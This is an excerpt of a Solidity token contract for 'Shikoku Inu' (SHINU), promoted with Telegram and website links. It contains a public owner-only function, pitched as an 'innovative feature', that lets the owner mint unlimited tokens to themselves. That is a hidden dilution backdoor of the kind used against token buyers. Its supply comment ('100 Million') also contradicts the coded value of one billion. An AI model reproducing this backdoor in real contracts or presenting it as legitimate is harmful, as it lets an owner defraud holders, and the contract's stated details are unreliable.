//
// $ShikokuInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ShikokuInu_Portal
// 📱 Website::https://shikokuinu.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShikokuInu(uint256 amount) public onlyOwner {
 _ShikokuInu(msg.sender, amount);
    }
    ...
    function _ShikokuInu(address account, uint256 amount) internal virtual {
...
contract $ShikokuInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Shikoku Inu", "SHINU") {
     _ShikokuInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}